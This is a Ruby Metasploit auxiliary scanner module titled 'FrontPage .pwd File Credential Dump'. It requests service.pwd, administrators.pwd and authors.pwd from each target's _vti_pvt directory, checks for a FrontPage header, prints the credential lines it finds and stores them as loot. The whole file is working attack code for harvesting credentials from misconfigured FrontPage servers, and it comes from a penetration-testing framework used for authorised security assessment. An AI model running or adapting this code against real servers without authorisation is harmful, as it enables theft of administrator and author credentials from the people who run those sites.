##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'FrontPage .pwd File Credential Dump',
      'Description'    => %q{
          This module downloads and parses the '_vti_pvt/service.pwd', '_vti_pvt/administrators.pwd', and '_vti_pvt/authors.pwd' files
       on a FrontPage server to find credentials.
      },
      'References'     =>
        [
          [ 'URL', 'http://sparty.secniche.org/' ]
        ],
      'Author'         =>
        [
          'Aditya K Sood @adityaksood', # Sparty tool'
          'Stephen Haywood @averagesecguy' # Metasploit module'
        ],
      'License'        => MSF_LICENSE,
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'The base path', '/'])
    ])
  end


  def get_pass_file(fname)
    uri = normalize_uri(target_uri.path, '_vti_pvt', fname)

    vprint_status("Requesting: #{uri}")
    res = send_request_cgi({
      'uri' => uri,
      'method' => 'GET',
    })

    unless res.code == 200
      vprint_status("File #{uri} not found.")
      return nil
    end

    vprint_status("Found #{uri}.")

    unless res.body.lines.first.chomp == '# -FrontPage-'
      vprint_status("File does not contain FrontPage credentials.")
      vprint_status(res.body)
      return nil
    end

    vprint_status("Found FrontPage credentials.")
    return res.body
  end

  def run_host(ip)
    files = ['service.pwd', 'administrators.pwd', 'authors.pwd']

    files.each do |filename|
      contents = get_pass_file(filename)

      next if contents == nil

      print_good("#{ip} - #{filename}")

      contents.each_line do |line|
        print_good(line.chomp)
      end

      print_line()

      store_loot("frontpage.pwd.file", "text/plain", ip, contents, filename)
    end
  end
end
